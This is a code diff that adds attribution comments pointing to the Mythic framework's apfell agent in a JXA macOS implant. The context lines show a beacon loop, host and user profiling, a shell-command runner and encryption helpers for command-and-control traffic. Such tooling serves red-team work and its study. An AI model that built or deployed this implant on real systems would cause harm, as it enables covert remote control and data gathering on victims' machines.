@@ -1,3 +1,4 @@
+// Pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L2-L7
 ObjC.import('Cocoa');
 ObjC.import('Foundation');
 ObjC.import('stdlib');
@@ -39,6 +40,7 @@ var sleepTime = "5";
 var newSleep = "%s";
 sleepTime = beacon(newSleep);
 
+// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L9-L30
 // Implant Information (Used to show what user, hostname, IP, etc)
 class agent{
 	constructor(){
@@ -94,6 +96,7 @@ function writeFile(file, data) {
     return "File written";
 };
 
+// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/shell.js#L2-L23
 function run_shell(command){
 	//simply run a shell command via doShellScript and return the response
     let response = "";
@@ -152,7 +155,7 @@ function enc(data){
     //console.log(final_message.base64EncodedStringWithOptions(0).js);
     return final_message.base64EncodedStringWithOptions(0).js;
 }
-
+// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/c2_profiles/HTTP.js#L115-L132
 function dec(nsdata){
     //takes in a base64 encoded string to be decrypted and returned
     let err = Ref();
@@ -171,7 +174,7 @@ function dec(nsdata){
     let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
     return decrypted_message;
 }
-
+// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L106-L115
 function decode(data) {
     // base64 decoding
 	if(typeof data == "string"){
@@ -183,7 +186,7 @@ function decode(data) {
 	var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
 	return decoded_data;
 }
-
+// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L116-L124
 function encode(data) {
     //base64 encoding
 	if(typeof data == "string"){
@@ -195,7 +198,7 @@ function encode(data) {
 	var encstring = ns_data.base64EncodedStringWithOptions(0).js;
 	return encstring;
 }
-
+// pulled from https://github.com/its-a-feature/Mythic/blob/master/Payload_Types/apfell/agent_code/base/apfell-jxa.js#L70-L74
 convert_to_nsdata = function(strData){
     // helper function to convert UTF8 strings to NSData objects
     var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
